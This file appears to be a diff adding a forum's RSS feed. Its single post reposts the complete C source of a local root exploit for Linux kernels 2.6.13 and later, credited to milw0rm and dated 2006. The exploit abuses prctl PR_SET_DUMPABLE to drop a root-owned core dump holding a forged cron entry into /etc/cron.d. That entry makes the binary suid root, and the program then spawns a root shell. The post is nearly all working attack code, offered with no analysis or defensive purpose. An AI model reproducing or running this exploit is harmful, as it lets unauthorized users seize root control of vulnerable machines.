@@ -1,0 +1,148 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0">
+	<channel>
+		<title><![CDATA[Latest posts for the topic "Linux kernel &gt;2.6.13 local root Xploit"]]></title>
+		<link>http://www.hvaonline.net/hvaonline/posts/list/13.hva</link>
+		<description><![CDATA[Latest messages posted in the topic "Linux kernel &gt;2.6.13 local root Xploit"]]></description>
+		<generator>JForum - http://www.jforum.net</generator>
+			<item>
+				<title>Linux kernel &amp;gt;2.6.13 local root Xploit</title>
+				<description><![CDATA[ <span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>/* Linux &gt;= 2.6.13 prctl kernel exploit
+ *
+ * &#40;C&#41; Julien TINNES
+ *
+ * If you read the Changelog from 2.6.13 you've probably seen:
+ *  &#91;PATCH&#93; setuid core dump
+ * 
+ * This patch mainly adds suidsafe to suid_dumpable sysctl but also a new per process,
+ * user setable argument to PR_SET_DUMPABLE.
+ * 
+ * This flaw allows us to create a root owned coredump into any directory.
+ * This is trivially exploitable.
+ *
+ */
+
+#include &lt;sys/types.h&gt;
+#include &lt;sys/time.h&gt;
+#include &lt;sys/resource.h&gt;
+#include &lt;sys/prctl.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;errno.h&gt;
+#include &lt;signal.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;time.h&gt;
+
+#define CROND "/etc/cron.d"
+#define BUFSIZE 2048
+
+
+struct rlimit myrlimit={RLIM_INFINITY, RLIM_INFINITY};
+
+char	crontemplate&#91;&#93;=
+"#/etc/cron.d/core suid_dumpable exploit\n"
+"SHELL=/bin/sh\n"
+"PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n"
+"#%s* * * * *	root	 chown root:root %s && chmod 4755 %s && rm -rf %s && kill -USR1 %d\n";
+
+char	cronstring&#91;BUFSIZE&#93;;
+char	fname&#91;BUFSIZE&#93;;
+
+struct timeval te;
+
+void sh&#40;int sn&#41; {
+	execl&#40;fname, fname, &#40;char *&#41; NULL&#41;;
+}
+	
+
+int	main&#40;int argc, char *argv&#91;&#93;&#41; {
+
+	int nw, pid;
+
+	if &#40;geteuid&#40;&#41; == 0&#41; {
+		printf&#40;"&#91;+&#93; getting root shell\n"&#41;;
+		setuid&#40;0&#41;;
+		setgid&#40;0&#41;;
+		if &#40;execl&#40;"/bin/sh", "/bin/sh", &#40;char *&#41; NULL&#41;&#41; {
+			perror&#40;"&#91;-&#93; execle"&#41;;
+			return 1;
+		}
+	}
+
+	printf&#40;"\nprctl&#40;&#41; suidsafe exploit\n\n&#40;C&#41; Julien TINNES\n\n"&#41;;
+
+	/* get our file name */
+	if &#40;readlink&#40;"/proc/self/exe", fname, sizeof&#40;fname&#41;&#41; == -1&#41; {
+		perror&#40;"&#91;-&#93; readlink"&#41;;
+		printf&#40;"This is not fatal, rewrite the exploit\n"&#41;;
+	}
+
+	if &#40;signal&#40;SIGUSR1, sh&#41; == SIG_ERR&#41; {
+		perror&#40;"&#91;-&#93; signal"&#41;;
+		return 1;
+	}
+	printf&#40;"&#91;+&#93; Installed signal handler\n"&#41;;
+
+	/* Let us create core files */
+	setrlimit&#40;RLIMIT_CORE, &myrlimit&#41;;
+	if &#40;chdir&#40;CROND&#41; == -1&#41; {
+		perror&#40;"&#91;-&#93; chdir"&#41;;
+		return 1;
+	}
+
+	/* exploit the flaw */
+	if &#40;prctl&#40;PR_SET_DUMPABLE, 2&#41; == -1&#41; {
+		perror&#40;"&#91;-&#93; prtctl"&#41;;
+		printf&#40;"Is you kernel version &gt;= 2.6.13 ?\n"&#41;;
+		return 1;
+	}
+
+	printf&#40;"&#91;+&#93; We are suidsafe dumpable!\n"&#41;;
+
+	/* Forge the string for our core dump */
+	nw=snprintf&#40;cronstring, sizeof&#40;cronstring&#41;, crontemplate, "\n", fname, fname, CROND"/core", getpid&#40;&#41;&#41;;
+	if &#40;nw &gt;= sizeof&#40;cronstring&#41;&#41; {
+		printf&#40;"&#91;-&#93; cronstring is too small\n"&#41;;
+		return 1;
+	}
+	printf&#40;"&#91;+&#93; Malicious string forged\n"&#41;;
+
+	if &#40;&#40;pid=fork&#40;&#41;&#41; == -1&#41; {
+		perror&#40;"&#91;-&#93; fork"&#41;;
+		return 1;
+	}
+
+	if &#40;pid == 0&#41; {
+		/* This is not the good way to do it ;&#41; */
+		sleep&#40;120&#41;;
+		exit&#40;0&#41;;
+	}
+
+	/* SEGFAULT the child */
+	printf&#40;"&#91;+&#93; Segfaulting child\n"&#41;;
+	if &#40;kill&#40;pid, 11&#41; == -1&#41; {
+		perror&#40;"&#91;-&#93; kill"&#41;;
+		return 1;
+	}
+	if &#40;gettimeofday&#40;&te, NULL&#41; == 0&#41; 
+		printf&#40;"&#91;+&#93; Waiting for exploit to succeed &#40;~%ld seconds&#41;\n", 60 - &#40;te.tv_sec%60&#41;&#41;;
+	sleep&#40;120&#41;;
+
+	printf&#40;"&#91;-&#93; It looks like the exploit failed\n"&#41;;
+
+	return 1;
+}
+
+// milw0rm.com &#91;2006-07-12&#93;</pre>
+		</div>
+
+---SOURCE: milw0rm.com---]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/1351.hva#6330</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/1351.hva#6330</link>
+				<pubDate><![CDATA[Thu, 13 Jul 2006 05:58:07]]> GMT</pubDate>
+				<author><![CDATA[ Mr.Khoai]]></author>
+			</item>
+	</channel>
+</rss>
